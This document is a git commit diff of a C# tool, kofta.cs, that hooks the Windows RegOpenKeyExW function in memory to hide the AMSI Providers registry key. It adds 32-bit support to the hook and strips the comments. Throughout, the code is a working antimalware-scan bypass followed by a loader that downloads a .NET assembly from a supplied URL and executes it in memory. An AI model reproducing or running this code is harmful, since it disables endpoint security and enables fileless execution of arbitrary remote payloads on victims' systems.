6c44e0afacc5c38a40d60094d56f047a6f7b156b
kofta0000 <mankofat0@gmail.com>
2025-05-29 01:14:32 +0300

    Update kofta.cs

--- kofta.cs
+++ kofta.cs
@@ -6,7 +6,6 @@ using System.Linq;
 
 public static class TrollDisappearKey
 {
-
     [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);
 
@@ -24,65 +23,83 @@ public static class TrollDisappearKey
 
     static public int oldProtect;
     static public IntPtr targetAddr, hookAddr;
-    static public byte[] originalBytes = new byte[12];
-    static public byte[] hookBytes = new byte[12];
+    static public byte[] originalBytes;
+    static public byte[] hookBytes;
+    static public int hookLength;
     static public int counter = 0;
-
+    static public bool is64 = IntPtr.Size == 8;
 
     public static void DisappearKey()
     {
         delegateRegOpenKeyExW A = RegOpenKeyWDetour;
+
         targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
         hookAddr = Marshal.GetFunctionPointerForDelegate(A);
-        Marshal.Copy(targetAddr, originalBytes, 0, 12);
-        hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
-        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
-        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
 
+        if (is64)
+        {
+            hookLength = 12;
+            originalBytes = new byte[hookLength];
+            Marshal.Copy(targetAddr, originalBytes, 0, hookLength);
+            hookBytes = new byte[] { 0x48, 0xB8 } // mov rax, imm64
+                .Concat(BitConverter.GetBytes((long)hookAddr))
+                .Concat(new byte[] { 0x50, 0xC3 }) // push rax; ret
+                .ToArray();
+        }
+        else
+        {
+            hookLength = 6;
+            originalBytes = new byte[hookLength];
+            Marshal.Copy(targetAddr, originalBytes, 0, hookLength);
+            int offset = (int)hookAddr - ((int)targetAddr + 5);
+            hookBytes = new byte[] { 0xE9 }
+                .Concat(BitConverter.GetBytes(offset))
+                .Concat(new byte[] { 0x90 }) // NOP padding
+                .ToArray();
+        }
+
+        VirtualProtect(targetAddr, hookLength, 0x40, out oldProtect);
+        Marshal.Copy(hookBytes, 0, targetAddr, hookLength);
     }
 
     static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
     {
         try
         {
-            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);
+            Marshal.Copy(originalBytes, 0, targetAddr, hookLength);
 
             if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
             {
-                counter = counter + 1;
+                counter++;
                 return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
             }
-            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
 
+            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
         }
         finally
         {
-             if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
+            if (counter == 0)
+            {
+                Marshal.Copy(hookBytes, 0, targetAddr, hookLength);
+            }
         }
     }
 
-
     public static void Main(string[] args)
     {
-        //ignore tls errors
         ServicePointManager.Expect100Continue = true;
         ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
-        //call the function to install the hook which essentially makes lpSubKey disappear
-        //if first argument is passed as disabled, hook will not trigger
         if (args[1].Split(',')[0] != "disable")
         {
             DisappearKey();
         }
 
-        //standard assembly load .exe and call main with args
         ExecuteAssembly(new WebClient().DownloadData(args[0]), args[1]);
     }
 
-
     public static void ExecuteAssembly(Byte[] assemblyBytes, string comma_separated_args)
     {
-
         Assembly assembly = Assembly.Load(assemblyBytes);
         MethodInfo method = assembly.EntryPoint;
 
@@ -91,12 +108,10 @@ public static class TrollDisappearKey
 
         while (input != "exit")
         {
-
             method.Invoke(null, parameters);
             Console.Write("Pass in arguments comma delimited or type exit\r\n");
             input = Console.ReadLine();
             parameters = new object[] { input.Split(',') };
-
         }
     }
 }
